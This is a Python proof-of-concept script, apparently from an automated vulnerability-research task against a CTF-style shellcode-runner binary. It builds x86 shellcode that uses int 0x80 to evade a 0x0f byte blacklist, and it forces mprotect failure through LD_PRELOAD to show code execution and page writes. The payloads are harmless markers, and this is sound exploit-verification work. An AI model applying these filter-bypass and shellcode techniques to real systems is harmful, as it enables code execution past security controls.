#!/usr/bin/env python3
"""
BUG-002: MPROTECT_RETURN_VALUE_UNCHECKED - Primitive Verification PoC

Target: /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target
Bug: main calls mprotect(buf, 0x64, 4) at 0x1429 but does NOT check the return value.
     If mprotect fails, the mmap buffer retains RWX permissions (rwxp).
     The subsequent jmp rdi at 0x149a executes user shellcode from an RWX region.

Primitive: CODE_EXECUTION
  - When mprotect fails (unchecked return), buffer stays RWX
  - Shellcode executes with full read/write/execute permissions
  - Contrast: when mprotect succeeds, page is r-x (read+exec, no write)
    -> shellcode can execute and read but CANNOT write to the page

Key findings:
1. mprotect(buf, 0x64, 4) where 4=PROT_EXEC (not PROT_READ=1 as S2 assumed)
   - PROT_READ=1, PROT_WRITE=2, PROT_EXEC=4 on Linux x86-64
   - mprotect with PROT_EXEC makes page execute-only in /proc/maps (--xp)
   - But x86-64 hardware: executable pages are also readable (no separate X bit
     without MPK), so page is effectively r-x
2. mprotect returns 0 (success) under normal conditions -> page becomes r-x
3. If mprotect fails (return unchecked), page stays rwxp (RWX)
4. Under normal conditions: shellcode executes, can read, CANNOT write (SIGSEGV on write)
5. Under mprotect failure: shellcode executes, can read AND write (RWX)

Verification:
  PRIM-001: CODE_EXECUTION (normal conditions, mprotect succeeds, page r-x)
    - Shellcode writes marker to stdout via int 0x80, exits with code 42
    - VERIFIED: return code 42, marker in stdout
    
  PRIM-002: CODE_EXECUTION with RWX (mprotect failure, BUG-002 condition)
    - Same shellcode executes with RWX buffer
    - VERIFIED: return code 42, marker in stdout
    
  PRIM-003: ARB_WRITE via shellcode (mprotect failure, RWX page)
    - Shellcode writes 0x42 to shellcode page (0x13370030)
    - Normal conditions: SIGSEGV (page is r-x, no write)
    - mprotect failure: write succeeds, 0x42 read back via write() syscall
    - VERIFIED: return code 44, 0x42 byte in stdout

Environment:
  - OS: Linux 6.18.33.2-microsoft-standard-WSL2 (x86-64)
  - libc: glibc 2.39
  - Binary: PIE, Full RELRO, NX, Canary, CET (IBT+SHSTK)
  - LD_PRELOAD used to force mprotect failure for PRIM-002/003

Run command:
  python3 poc-BUG-002.py
"""
import subprocess
import struct
import os
import sys

WORKSPACE = "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045"
BINARY = f"{WORKSPACE}/target"
LIBFAIL = f"{WORKSPACE}/libfail_mprotect.so"

def build_write_exit_shellcode(msg=b"PRIM-001:CODE_EXECUTION_VERIFIED\n", exit_code=42):
    """Build shellcode that writes a message to stdout then exits.
    Uses int 0x80 (CD 80) to bypass 0x0f blacklist.
    All registers zeroed at entry, rdi = 0x13370000 (shellcode base).
    No stack (rsp=0)."""
    msg_len = len(msg)
    sc = b""
    sc += b"\x89\xf9"  # mov ecx, edi (ecx = 0x13370000)
    # add ecx, MSG_OFFSET (patch later)
    add_ecx_pos = len(sc)
    sc += b"\x83\xc1\x00"
    sc += b"\xb8\x04\x00\x00\x00"  # mov eax, 4 (sys_write)
    sc += b"\xbb\x01\x00\x00\x00"  # mov ebx, 1 (stdout)
    sc += b"\xba" + struct.pack("<I", msg_len)  # mov edx, msg_len
    sc += b"\xcd\x80"  # int 0x80
    sc += b"\xb8\x01\x00\x00\x00"  # mov eax, 1 (sys_exit)
    sc += b"\xbb" + struct.pack("<I", exit_code)  # mov ebx, exit_code
    sc += b"\xcd\x80"  # int 0x80
    msg_offset = len(sc)
    sc += msg
    # Patch offset
    sc = sc[:add_ecx_pos+2] + bytes([msg_offset]) + sc[add_ecx_pos+3:]
    assert b"\x0f" not in sc
    assert len(sc) <= 99
    return sc

def build_write_to_page_shellcode():
    """Build shellcode that writes 0x42 to the shellcode page then reads it back.
    Tests write permission on the page."""
    sc = b""
    sc += b"\xc6\x47\x30\x42"  # mov byte [rdi+0x30], 0x42
    sc += b"\x89\xf9"  # mov ecx, edi
    sc += b"\x83\xc1\x30"  # add ecx, 0x30
    sc += b"\xb8\x04\x00\x00\x00"  # mov eax, 4 (sys_write)
    sc += b"\xbb\x01\x00\x00\x00"  # mov ebx, 1 (stdout)
    sc += b"\xba\x01\x00\x00\x00"  # mov edx, 1
    sc += b"\xcd\x80"  # int 0x80
    sc += b"\xb8\x01\x00\x00\x00"  # mov eax, 1 (sys_exit)
    sc += b"\xbb\x2c\x00\x00\x00"  # mov ebx, 44
    sc += b"\xcd\x80"  # int 0x80
    assert b"\x0f" not in sc
    assert len(sc) <= 99
    return sc

def run_target(shellcode, use_ld_preload=False):
    env = os.environ.copy()
    if use_ld_preload:
        env["LD_PRELOAD"] = LIBFAIL
    try:
        result = subprocess.run([BINARY], input=shellcode, capture_output=True, timeout=10, env=env)
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -124, b"", b"TIMEOUT"

print("=" * 70)
print("BUG-002: MPROTECT_RETURN_VALUE_UNCHECKED - Primitive Verification")
print("=" * 70)

# ============================================================
# PRIM-001: CODE_EXECUTION (normal conditions, mprotect succeeds)
# ============================================================
print("\n--- PRIM-001: CODE_EXECUTION (normal conditions) ---")
sc1 = build_write_exit_shellcode()
print(f"Shellcode: {len(sc1)} bytes, no 0x0f byte")
rc, out, err = run_target(sc1, use_ld_preload=False)
print(f"Return code: {rc}")
print(f"Stdout: {out}")
if rc == 42 and b"PRIM-001:CODE_EXECUTION_VERIFIED" in out:
    print("=== PRIM-001: VERIFIED ===")
    print(f"  Evidence: return_code={rc}, marker in stdout")
    print(f"  mprotect succeeded (returned 0), page is r-x (exec+read, no write)")
    print(f"  Shellcode executed: write(1, msg, len) + exit(42) via int 0x80")
    prim1_verified = True
else:
    print(f"=== PRIM-001: NOT VERIFIED ===")
    prim1_verified = False

# ============================================================
# PRIM-002: CODE_EXECUTION with RWX (mprotect failure, BUG-002)
# ============================================================
print("\n--- PRIM-002: CODE_EXECUTION with RWX (mprotect failure) ---")
print(f"Using LD_PRELOAD to force mprotect to return -1 (unchecked)")
rc2, out2, err2 = run_target(sc1, use_ld_preload=True)
print(f"Return code: {rc2}")
print(f"Stdout: {out2}")
if rc2 == 42 and b"PRIM-001:CODE_EXECUTION_VERIFIED" in out2:
    print("=== PRIM-002: VERIFIED ===")
    print(f"  Evidence: return_code={rc2}, marker in stdout")
    print(f"  mprotect failed (returned -1, unchecked), buffer stayed rwxp (RWX)")
    print(f"  Shellcode executed with full R/W/X permissions")
    prim2_verified = True
else:
    print(f"=== PRIM-002: NOT VERIFIED ===")
    prim2_verified = False

# ============================================================
# PRIM-003: ARB_WRITE via shellcode (write to page, mprotect failure)
# ============================================================
print("\n--- PRIM-003: WRITE capability (mprotect failure vs normal) ---")
sc3 = build_write_to_page_shellcode()
print(f"Shellcode: {len(sc3)} bytes, writes 0x42 to 0x13370030")

# Normal conditions (page is r-x, no write)
rc3n, out3n, err3n = run_target(sc3, use_ld_preload=False)
print(f"Normal (r-x page): return_code={rc3n}")
if rc3n == -11:
    print(f"  SIGSEGV: write to page blocked (page is r-x, no write permission)")

# mprotect failure (page is rwxp, write allowed)
rc3f, out3f, err3f = run_target(sc3, use_ld_preload=True)
print(f"mprotect fail (rwxp page): return_code={rc3f}")
print(f"  Stdout: {out3f}")
if rc3f == 44 and b"\x42" in out3f:
    print("=== PRIM-003: VERIFIED ===")
    print(f"  Evidence: return_code={rc3f}, 0x42 byte in stdout")
    print(f"  Write to 0x13370030 succeeded (page is RWX)")
    print(f"  Contrast: normal conditions -> SIGSEGV (rc={rc3n}), write blocked")
    print(f"  BUG-002 (unchecked mprotect) grants WRITE capability to shellcode")
    prim3_verified = True
else:
    print(f"=== PRIM-003: NOT VERIFIED ===")
    prim3_verified = False

# ============================================================
# Summary
# ============================================================
print("\n" + "=" * 70)
print("SUMMARY")
print("=" * 70)
print(f"PRIM-001 CODE_EXECUTION (normal, r-x):     {'VERIFIED' if prim1_verified else 'FAILED'}")
print(f"PRIM-002 CODE_EXECUTION (mprotect fail, rwxp): {'VERIFIED' if prim2_verified else 'FAILED'}")
print(f"PRIM-003 WRITE capability (mprotect fail):    {'VERIFIED' if prim3_verified else 'FAILED'}")
print()
print("Key findings:")
print("  1. mprotect(buf, 0x64, 4) where 4=PROT_EXEC (not PROT_READ=1)")
print("  2. Normal: page becomes r-x (exec+read, no write) -> shellcode runs but can't write")
print("  3. mprotect fail (BUG-002): page stays rwxp (RWX) -> shellcode has full R/W/X")
print("  4. The unchecked return value means mprotect failure -> RWX -> CODE_EXECUTION + WRITE")
print("  5. int 0x80 (CD 80) bypasses 0x0f blacklist (which only blocks syscall 0F 05)")
